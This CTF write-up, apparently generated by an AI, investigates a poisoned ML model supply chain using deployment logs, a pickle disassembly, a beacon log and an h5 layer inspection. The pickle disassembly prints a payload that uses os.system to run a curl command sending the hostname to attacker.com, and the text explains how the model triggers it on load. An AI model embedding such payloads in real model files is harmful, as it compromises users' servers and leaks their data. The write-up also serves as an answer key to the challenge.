# CTF Writeup: Machine Learning Supply Chain Compromise
(*solved by gemini 🤖🤖🤖*)
## Overview
This challenge involves investigating a compromised machine learning inference server that started making unusual outbound network connections. The scenario highlights the risks associated with pulling ML models from external repositories (supply chain attacks) and the different ways malicious payloads can be embedded within popular model formats like Pickle (.pkl) and HDF5 (.h5).

The investigation materials were located on the target server at `/opt/supply-chain/incident/`.

## Challenge Walkthrough

### 1. Analyzing the Deployment Logs
The first step was to establish a timeline and understand what changes occurred on the server. We checked the deployment log.

**Command Used:**
```bash
sshpass -p analyst123 ssh -o StrictHostKeyChecking=no analyst@10.48.161.126 "cat /opt/supply-chain/incident/logs/deployment.log"
```

**Findings:**
The logs revealed the model update history:
- **2024-01-05:** Original model (`code-review-bert v1.0.0`) deployed from `verified-ml-team`.
- **2024-01-26:** A model update was requested. Crucially, the source organization changed to `trustworthy-ai-lab` for `code-review-bert-v2`. A warning was logged: `WARN New source organisation detected: trustworthy-ai-lab`.
- **2024-02-16:** A SOC alert fired due to unusual outbound HTTPS traffic to `attacker.com:443`.

**Answer 1:** The replacement model came from the organization **trustworthy-ai-lab**.

### 2. Timeline Analysis
Based on the deployment log, the malicious replacement model was deployed on **January 26, 2024**, and the SOC alert was triggered on **February 16, 2024**.

Calculation: 
- Days in January after the 26th: 31 - 26 = 5 days.
- Days in February until the alert: 16 days.
- Total days = 5 + 16 = 21 days.

**Answer 2:** **21** days passed between the deployment and the SOC alert.

### 3. Inspecting the Production Model
The SOC alert indicated malicious behavior, likely stemming from the `production_model.pkl` deployed on January 26th. Pickle files in Python are known to be vulnerable to arbitrary code execution upon deserialization.

To analyze the Pickle file without fully executing it, we used the standard Python `pickletools` module to disassemble the pickle opcodes. We copied the files locally first.

**Commands Used:**
```bash
# Copy files locally
sshpass -p analyst123 scp -r -o StrictHostKeyChecking=no analyst@10.48.161.126:/opt/supply-chain/incident/ /home/kali/incident

# Disassemble the pickle file
python3 -m pickletools /home/kali/incident/models/production_model.pkl
```

**Findings from Pickle Disassembly:**
```text
    0: \x80 PROTO      4
    2: \x95 FRAME      79
   11: \x8c SHORT_BINUNICODE 'os'
   15: \x94 MEMOIZE    (as 0)
   16: \x8c SHORT_BINUNICODE 'system'
   24: \x94 MEMOIZE    (as 1)
   25: \x93 STACK_GLOBAL
...
   27: \x8c SHORT_BINUNICODE 'curl "http://attacker.com/beacon" -d "host=$(hostname)"'
...
   87: R    REDUCE
```
The disassembly clearly showed that upon loading, the model executes a system command using Python's `os.system` function.

**Answer 3:** The Python function used to execute the shell command is **system**.

The exact shell command executed was: `curl "http://attacker.com/beacon" -d "host=$(hostname)"`. The subshell `$(hostname)` is used to grab the victim server's name.

**Answer 4:** The shell command used to capture the host's identity is **hostname**.

### 4. Network Log Analysis
Next, we reviewed the network captures to see the actual traffic generated by the malicious payload.

**Command Used:**
```bash
cat /home/kali/incident/logs/beacon_capture.log
```

**Findings:**
```text
[2024-02-16 03:13:47] SESSION beacon-4821 ESTABLISHED  src=10.0.1.50  dst=attacker.com:443
[2024-02-16 03:13:47] REQUEST POST /beacon HTTP/1.1
[2024-02-16 03:13:47] HOST attacker.com
[2024-02-16 03:13:47] PAYLOAD host=ml-server-prod-01&id=THM{b4ckd00r_1n_
[2024-02-16 03:13:48] SESSION beacon-4821 BLOCKED  bytes_captured=51  reason=SOC_RULE_4821
```
The log shows a `POST` request to the attacker's server. The payload contains the host identity and the first part of the flag: `THM{b4ckd00r_1n_`.

**Answer 5:** The HTTP method used in the outbound request is **POST**.

### 5. Analyzing the Candidate Model
The scenario mentioned a candidate replacement model (`candidate_model.h5`) that the engineering team had staged but not yet deployed. H5 (HDF5) files used by Keras/TensorFlow can also harbor malicious code, specifically within custom layers like `Lambda` layers, which can contain arbitrary Python functions.

We used a provided tool, `inspect_h5_model.py`, to safely inspect the model's architecture.

**Command Used:**
```bash
# Locate the tool
sshpass -p analyst123 ssh -o StrictHostKeyChecking=no analyst@10.48.161.126 "find /opt /home /usr -name inspect_h5_model.py 2>/dev/null"
# Output: /opt/supply-chain/tools/inspect_h5_model.py

# Run the inspection
sshpass -p analyst123 ssh -o StrictHostKeyChecking=no analyst@10.48.161.126 "python3 /opt/supply-chain/tools/inspect_h5_model.py /opt/supply-chain/incident/models/candidate_model.h5"
```

**Findings:**
```text
=== Architecture Inspection: candidate_model.h5 ===
  Total layers: 5
  [OK]      InputLayer           input_layer_2
  [OK]      Flatten              flatten_2
  [OK]      Dense                dense_4
  [OK]      Dense                dense_5
  [WARNING] Lambda               manipulate_output (function: manipulate_output)
            exfil_suffix: pl41n_s1ght}

  RESULT: 1 layer(s) require review
    - Lambda (manipulate_output): Can contain arbitrary Python code that executes at inference time
```
The inspection flagged a suspicious `Lambda` layer named `manipulate_output`. It also revealed the second part of the flag: `pl41n_s1ght}`.

**Answer 6:** The name of the suspicious layer is **manipulate_output**.

### 6. Assembling the Flag
The attacker split the flag into two parts to evade detection. 
- Part 1 (from `beacon_capture.log`): `THM{b4ckd00r_1n_`
- Part 2 (from `candidate_model.h5`): `pl41n_s1ght}`

Combining them gives the complete flag.

**Answer 7:** The complete flag is **THM{b4ckd00r_1n_pl41n_s1ght}**.
